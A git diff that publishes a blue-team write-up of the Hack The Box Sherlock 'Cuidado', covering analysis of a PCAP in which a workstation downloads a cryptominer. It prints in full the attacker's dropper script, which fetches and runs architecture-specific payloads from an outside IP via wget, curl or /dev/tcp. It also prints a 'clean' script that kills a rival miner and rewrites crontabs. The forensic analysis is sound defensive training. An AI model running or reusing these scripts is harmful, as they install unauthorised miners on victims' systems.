@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="robots" content="noindex">
+    <meta name="robots" content="index, follow">
     <title>Cuidado - Hexicon Archives</title>
     <link rel="icon" type="image/x-icon" sizes="500x500" href="../favicon.png">
     <link rel="stylesheet" href="../style.css">
     <link rel="canonical" href="https://hexphased.github.io/hexicon-archives/sherlocks/Cuidado.html" />
     <!-- Sherlock-specific metadata for SEO -->
-    <meta name="description" content="Restricted writeup for Cuidado sherlock - Easy difficulty level">
+    <meta name="description" content="Writeup for Cuidado sherlock - Easy difficulty level">
     <meta name="keywords" content="Sherlock, Cuidado, Easy, Blue Team, writeup, cybersecurity, threat hunting, Hexicon">
 </head>
 <body>
@@ -64,16 +64,241 @@
         <h1 class="writeup-title">Cuidado</h1>
         <div class="writeup-metadata">
             <span class="difficulty easy">Easy</span>
-            <span class="date">Active sherlock</span>
+            <span class="date">December 11, 2025</span>
         </div>
         
         <div class="writeup-container">
             <div class="writeup-body">
                 <!-- Sherlock-specific content goes here -->
-                <p><img alt="Cuidado" src="../images/Cuidado/solved.png" /></p>
-<p>Cuidado is an <strong>ACTIVE</strong> sherlock!</p>
-<p>This write-up will go live once Cuidado retires.</p>
-<p>Please note that I’m following Hack The Box’s guidelines by not posting detailed solutions while the sherlock is still live.</p>
+                <p><img alt="solved" src="../images/Cuidado/solved.png" /></p>
+<pre class="codehilite"><code>Recently, a user triggered multiple alerts after downloading several potentially unwanted applications (PUAs), prompting concern from the security team.
+To gain deeper insight into the user's activity, the team began monitoring network traffic from their workstation. Their objective is to assess whether the downloads are linked to more serious malware threats.
+</code></pre>
+
+<h1>Task 1</h1>
+<p><code>What is the victim's IP address?</code></p>
+<p>The challenge archive contains a singular PCAP file. I will use Wireshark to analyse it.</p>
+<p><img alt="get" src="../images/Cuidado/get.png" /></p>
+<p>Immediately after opening the file, I can see a few requests originating from <code>192.168.1.152</code>. More than that, the same IP address is reaching out to <code>ocsp.godaddy.com</code>, an <code>Online Certificate Status Protocol</code> server address for GoDaddy.</p>
+<p>This allows web browsers to check in real-time if an SSL/TLS certificate issued by GoDaddy has been revoked or is still valid. This action was most definitely initiated by the victim themselves, which confirms that the IP belongs to them.</p>
+<p><img alt="task1" src="../images/Cuidado/task1.png" /></p>
+<h1>Task 2</h1>
+<p><code>What is the IP address of the attacker from whom the files were downloaded?</code></p>
+<p>I can see all the downloaded objects within this PCAP by going to <code>Export Objects -&gt; HTTP</code></p>
+<p><img alt="downloads" src="../images/Cuidado/downloads.png" /></p>
+<p>There are unusual files being downloaded from the <code>94.256.177.109</code> address. Most of the downloaded content comes from the certificate-related domains and has the content type of <code>application/ocsp-response</code>, but this address sticks out like a sore thumb.</p>
+<p><img alt="task2" src="../images/Cuidado/task2.png" /></p>
+<h1>Task 3</h1>
+<p><code>Which malicious file appears to be the first one downloaded?</code></p>
+<p>I know <em>which</em> files were downloaded, and actually, I already know the order in which they were downloaded. This is because the exported objects list is sorted from the earliest to the latest packet.</p>
+<p>To confirm that this is right, I'll use the filter tab in Wireshark to view HTTP packets only.</p>
+<p><img alt="file" src="../images/Cuidado/file.png" /></p>
+<p><code>sh</code> is the first file downloaded. The <code>/</code> endpoint serves as a redirect to the main page/index of the website, and is not a file.</p>
+<p><img alt="task3" src="../images/Cuidado/task3.png" /></p>
+<h1>Task 4</h1>
+<p><code>What is the name of the function that the attacker used to downlollad the payload?</code></p>
+<p>I can export the <code>sh</code> file onto my box by selecting it in the exported objects window and pressing <code>save</code></p>
+<p><img alt="sh" src="../images/Cuidado/sh.png" /></p>
+<pre class="codehilite"><code># sh
+
+#!/bin/bash
+
+dlr() {
+  wget http://94.156.177.109/$1 || curl -O http://94.156.177.109/$1
+  if [ $? -ne 0 ]; then
+    exec 3&lt;&gt;&quot;/dev/tcp/94.156.177.109/80&quot;
+    echo -e &quot;GET /$1 HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n&quot; &gt;&amp;3
+    (while read -r line; do [ &quot;$line&quot; = $'\r' ] &amp;&amp; break; done &amp;&amp; cat) &lt;&amp;3 &gt;$1
+    exec 3&gt;&amp;-
+  fi
+}
+
+NOEXEC_DIRS=$(cat /proc/mounts | grep 'noexec' | awk '{print $2}')
+EXCLUDE=&quot;&quot;
+
+for dir in $NOEXEC_DIRS; do
+  EXCLUDE=&quot;${EXCLUDE} -not -path \&quot;$dir\&quot; -not -path \&quot;$dir/*\&quot;&quot;
+done
+
+FOLDERS=$(eval find / -type d -user $(whoami) -perm -u=rwx -not -path \&quot;/tmp/*\&quot; -not -path \&quot;/proc/*\&quot; $EXCLUDE 2&gt;/dev/null)
+ARCH=$(uname -mp)
+OK=true
+
+for i in $FOLDERS /tmp /var/tmp /dev/shm; do
+  if cd &quot;$i&quot; &amp;&amp; touch .testfile &amp;&amp; (dd if=/dev/zero of=.testfile2 bs=2M count=1 &gt;/dev/null 2&gt;&amp;1 || truncate -s 2M .testfile2 &gt;/dev/null 2&gt;&amp;1); then
+    rm -rf .testfile .testfile2
+    break
+  fi
+done
+
+dlr clean
+chmod +x clean
+sh clean &gt;/dev/null 2&gt;&amp;1
+rm -rf clean
+
+rm -rf .redtail
+if echo &quot;$ARCH&quot; | grep -q &quot;x86_64&quot; || echo &quot;$ARCH&quot; | grep -q &quot;amd64&quot;; then
+  dlr x86_64
+  mv x86_64 .redtail
+elif echo &quot;$ARCH&quot; | grep -q &quot;i[3456]86&quot;; then
+  dlr i686
+  mv i686 .redtail
+elif echo &quot;$ARCH&quot; | grep -q &quot;armv8&quot; || echo &quot;$ARCH&quot; | grep -q &quot;aarch64&quot;; then
+  dlr aarch64
+  mv aarch64 .redtail
+elif echo &quot;$ARCH&quot; | grep -q &quot;armv7&quot;; then
+  dlr arm7
+  mv arm7 .redtail
+else
+  OK=false
+  for a in x86_64 i686 aarch64 arm7; do
+    dlr $a
+    cat $a &gt;.redtail
+    chmod +x .redtail
+    ./.redtail $1 &gt;/dev/null 2&gt;&amp;1
+    rm -rf $a
+  done
+fi
+
+if [ $OK = true ]; then
+  chmod +x .redtail
+  ./.redtail $1 &gt;/dev/null 2&gt;&amp;1
+fi
+</code></pre>
+
+<p>This is the whole <code>sh</code> script. It begins with a <code>dlr</code> function which downloads a provided file (in this case, <code>clean</code>), with some nice fallback methods in place if wget or curl are not present on the target.</p>
+<p><img alt="task4" src="../images/Cuidado/task4.png" /></p>
+<h1>Task 5</h1>
+<p><code>Which port does the attacker's server use?</code></p>
+<p>By default, curl and wget will use port 80 if it's not specified. If that wasn't known, this line <code>exec 3&lt;&gt;"/dev/tcp/94.156.177.109/80"</code> reveals the port completely.</p>
+<p><img alt="task5" src="../images/Cuidado/task5.png" /></p>
+<h1>Task 6</h1>
+<p><code>The script checks which directories it can write to by attempting to create test files. What is the size of the second test file? (Size in MB)</code></p>
+<p>The mentioned functionality is located within one of the FOR loops.</p>
+<pre class="codehilite"><code>for i in $FOLDERS /tmp /var/tmp /dev/shm; do
+  if cd &quot;$i&quot; &amp;&amp; touch .testfile &amp;&amp; (dd if=/dev/zero of=.testfile2 bs=2M count=1 &gt;/dev/null 2&gt;&amp;1 || truncate -s 2M .testfile2 &gt;/dev/null 2&gt;&amp;1); then
+    rm -rf .testfile .testfile2
+    break
+  fi
+done
+</code></pre>
+
+<p>For each folder under <code>/tmp</code>, <code>/var/tmp</code> and <code>/dev/shm</code>, it will try to write two files. One empty, created with touch(0MB), and one  with a size of 2M(made with dd), then delete them. This is done to check which directories are writable and which are not.</p>
+<p><img alt="task6" src="../images/Cuidado/task6.png" /></p>
+<h1>Task 7</h1>
+<p><code>What is the full command that the script uses to identify the CPU architecture?</code></p>
+<p>A bit further in the script, <code>uname -mp</code> is used to grab the machine hardware name and the processor type.</p>
+<p><code>ARCH=$(uname -mp)</code></p>
+<p>The processor type is then used to determine which file should be downloaded next from the attacker-controlled server.</p>
+<pre class="codehilite"><code>rm -rf .redtail
+if echo &quot;$ARCH&quot; | grep -q &quot;x86_64&quot; || echo &quot;$ARCH&quot; | grep -q &quot;amd64&quot;; then
+  dlr x86_64
+  mv x86_64 .redtail
+elif echo &quot;$ARCH&quot; | grep -q &quot;i[3456]86&quot;; then
+  dlr i686
+  mv i686 .redtail
+elif echo &quot;$ARCH&quot; | grep -q &quot;armv8&quot; || echo &quot;$ARCH&quot; | grep -q &quot;aarch64&quot;; then
+  dlr aarch64
+  mv aarch64 .redtail
+elif echo &quot;$ARCH&quot; | grep -q &quot;armv7&quot;; then
+  dlr arm7
+  mv arm7 .redtail
+else
+  OK=false
+  for a in x86_64 i686 aarch64 arm7; do
+    dlr $a
+    cat $a &gt;.redtail
+    chmod +x .redtail
+    ./.redtail $1 &gt;/dev/null 2&gt;&amp;1
+    rm -rf $a
+  done
+fi
+</code></pre>
+
+<p><img alt="task7" src="../images/Cuidado/task7.png" /></p>
+<h1>Task 8</h1>
+<p><code>What is the name of the file that is downloaded after the CPU architecture is compared with reference values?</code></p>
+<p>Here is the list of all the files downloaded from the attacker in order:</p>
+<pre class="codehilite"><code>sh
+
+clean
+
+x86_64 [!]
+</code></pre>
+
+<p>The last file fits what I already know. The victim machine's architecture must have been x86_64, and as a result, a malicious file with the same name was downloaded from the attacker.</p>
+<p><img alt="task8" src="../images/Cuidado/task8.png" /></p>
+<h1>Task 9</h1>
+<p><code>What is the full command that the attacker used to disable any existing mining service?</code></p>
+<p>I'll take a look at the next downloaded file, <code>clean</code></p>
+<pre class="codehilite"><code>#!/bin/bash
+
+clean_crontab() {
+  chattr -ia &quot;$1&quot;
+  grep -vE 'wget|curl|/dev/tcp|/tmp|\.sh|nc|bash -i|sh -i|base64 -d' &quot;$1&quot; &gt;/tmp/clean_crontab
+  mv /tmp/clean_crontab &quot;$1&quot;
+}
+
+systemctl disable c3pool_miner
+systemctl stop c3pool_miner
+
+chattr -ia /var/spool/cron/crontabs
+for user_cron in /var/spool/cron/crontabs/*; do
+  [ -f &quot;$user_cron&quot; ] &amp;&amp; clean_crontab &quot;$user_cron&quot;
+done
+
+for system_cron in /etc/crontab /etc/crontabs; do
+  [ -f &quot;$system_cron&quot; ] &amp;&amp; clean_crontab &quot;$system_cron&quot;
+done
+
+for dir in /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly /etc/cron.d; do
+  chattr -ia &quot;$dir&quot;
+  for system_cron in &quot;$dir&quot;/*; do
+    [ -f &quot;$system_cron&quot; ] &amp;&amp; clean_crontab &quot;$system_cron&quot;
+  done
+done
+
+clean_crontab /etc/anacrontab
+
+for i in /tmp /var/tmp /dev/shm; do
+  rm -rf $i/*
+done
+</code></pre>
+
+<p>This script cleans the provided file by searching for anything NOT matching the pattern provided in the <code>grep -vE</code> command, and saving that to the /tmp/clean_crontab file. It'll then overwrite any provided file with the cleaned crontab.</p>
+<p>It then disables and stops a <code>c3pool_miner</code> service, and cleans every crontab file listed in the script.</p>
+<p><img alt="task9" src="../images/Cuidado/task9.png" /></p>
+<h1>Task 10</h1>
+<p><code>Apparently, the attacker used a packer to compress the malware. Which version of this packer was used? (Format X.XX)</code></p>
+<p>I will open the <code>x86_64</code> file in DIE(Detect It Easy) to gather more information about it.</p>
+<p><img alt="die" src="../images/Cuidado/die.png" /></p>
+<p>The malware is packed with the UPX packer 4.23. Another way to find this without using DIE at all is to run strings against the executable.</p>
+<p><img alt="strings" src="../images/Cuidado/strings.png" /></p>
+<p><img alt="task10" src="../images/Cuidado/task10.png" /></p>
+<h1>Task 11</h1>
+<p><code>What is the entropy value of unpacked malware?</code></p>
+<p>I'll unpack the file using UPX itself with the -d flag.</p>
+<p><img alt="unpack" src="../images/Cuidado/unpack.png" /></p>
+<p>Sending this unpacked file over into DIE reveals more information, but the crucial one for this challenge isn't precise enough.</p>
+<p><img alt="die22222" src="../images/Cuidado/die22222.png" /></p>
+<p>DIE displays the entropy value as <code>6.48845</code>, but it is not the valid answer. To get a more precise value, I will use the <code>ent</code> binary to calculate the entropy value of this executable.</p>
+<p><img alt="ent" src="../images/Cuidado/ent.png" /></p>
+<p>This value has 1 space more than the one from DIE, and as such, is the correct answer.</p>
+<p><img alt="task11" src="../images/Cuidado/task11.png" /></p>
+<h1>Task 12</h1>
+<p><code>What is the file name with which the unpacked malware was submitted on VirusTotal for the first time?</code></p>
+<p>I'll upload the malware to VirusTotal in its unpacked form.</p>
+<p><img alt="vtotal" src="../images/Cuidado/vtotal.png" /></p>
+<p>VT identifies the malware as a miner. Looking at the details tab, I can see a list of names with which it had been uploaded by other users before.</p>
+<p><img alt="list" src="../images/Cuidado/list.png" /></p>
+<p>The earliest names lie at the bottom. After expanding the list, I scrolled down to the last result and found the answer.</p>
+<p><img alt="task12" src="../images/Cuidado/task12.png" /></p>
+<h1>Task 13</h1>
+<p><code>What MITRE ATT&amp;CK technique ID is associated with the main purpose of the malware?</code></p>
+<p>The malware's main purpose is mining cryptocurrency. Searching for the appropriate MITRE ATT&amp;CK ID led me to the ID of <code>T1496</code></p>
+<p><code>https://attack.mitre.org/techniques/T1496/</code></p>
+<p><img alt="task13" src="../images/Cuidado/task13.png" /></p>
+<p>Solved!</p>
             </div>
             
             <div class="toc-sidebar">
